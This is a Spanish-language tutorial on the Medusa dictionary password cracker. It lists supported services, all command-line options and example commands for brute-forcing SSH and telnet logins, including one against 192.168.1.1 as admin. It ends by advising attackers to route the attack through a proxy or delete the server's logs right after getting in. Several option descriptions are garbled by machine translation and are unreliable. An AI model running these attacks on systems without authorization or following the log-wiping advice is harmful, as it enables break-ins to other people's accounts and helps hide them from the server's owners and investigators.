Con medusa puedes crackear por diccionario de una manera muy rápida los siguientes servicios:

AFP
CVS
FTP
HTTP
IMAP
MS-SQL
MySQL
NetWare NCP
NNTP
PcAnywhere
POP3
PostgreSQL
REXEC
RLOGIN
RSH
SMBNT
SMTP-AUTH
SMTP-VRFY
SNMP
SSHv2
Subversion (SVN)
Telnet
VMware autenticación Daemon (vmauthd)
VNC
Genérico Wrapper
Web Form

Sintaxis

Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]


Opciones

-h [TEXT] : el host víctima
-H [FILE] : si tenemos un archivo txt con una lista de hosts
-u [TEXT] : el usuario al cual deseamos hacerle el cracking
-U [FILE] : un archivo txt con la lista de posibles usuarios (muy útil si no sabemos que usuarios existen en el sistema)
-p [TEXT] : Contraseña para probar
-P [FILE] : Ubicación del diccionario
-C [FILE] : Archivo que contiene las entradas combo. Consulte el archivo Léame para obtener más información.
-O [FILE] : Crea un archivo log
-e [n/s/ns] : Controles de contraseña (contraseña de No [n], [s] contraseña = Username)
-M [TEXT] : El modulo que deseamos emplear (sin la extension .mod)
-m [TEXT] : Parámetro para pasar al módulo. Esto puede pasar varias veces con un parámetro diferente cada vez, y todos llegarán al módulo (es decir -m Param1 -m Param2, etc..)
-d : Descarga todos los módulos conocidos
-n [NUM] : por si el servicio esta corriendo en otro puerto diferente al default
-s : Habilita ssl
-g [NUM] : Renunciar después de tratar de conectar para segundos NUM (por defecto 3)
-r [NUM] : Sueño NUM segundos entre reintentos intentos (por defecto 3)
-R [NUM] : Trate de reintentos NUM antes de renunciar. El número total de intentos será NUM 1.
-t [NUM] : Número total de inicios de sesión a probarse al mismo tiempo
-T [NUM] : Número total de los ejércitos a probarse al mismo tiempo
-L : Paralelizar los inicios de sesión con un nombre de usuario por hilo. El valor predeterminado es procesar el nombre de usuario completo antes de proceder.
-f : detiene el ataque en el instante de encontrar un password valido
-F : Después de la primera válida contraseña en cualquier host deje de auditoría.
-b : suprime los banners
-q : Mostrar información sobre el uso del módulo
-v [NUM] : Nivel detallado [0 - 6 (more)]
-w [NUM] : Nivel de depuración de errores [0 - 10 (more)]
-V : Versión de la pantalla
-Z [TEXT] : Análisis de currículo basado en mapa de exploración anterior


Ejemplos

Lista de módulos disponibles

medusa -d

Ataque de fuerza bruta al propio servidor con el usuario ejemplo y un diccionario de contraseñas llamado passfile servicio ssh

medusa -h 127.0.0.1 -u ejemplo -P passfile -M ssh

En este caso vamos a realizar el ataque a un equipo corriendo telnet y conocemos que el usuario es admin:

medusa -h 192.168.1.1 -u admin -P claves.txt -M telnet -f -b -v 6 -e ns


Cuando nos encontramos un servidor “vulnerable” a un ataque de fuerza bruta con diccionario, debemos tener muchisimo cuidado, ya que un ataque de esta naturaleza hace demasiado “RUIDO” es decir, todos los intentos de conexion quedaran guardados en los logs del servidor, por eso es pertinente usar un proxy para hacer el ataque, o en su defecto borrar los logs, inmediatamente despues de entrar al server
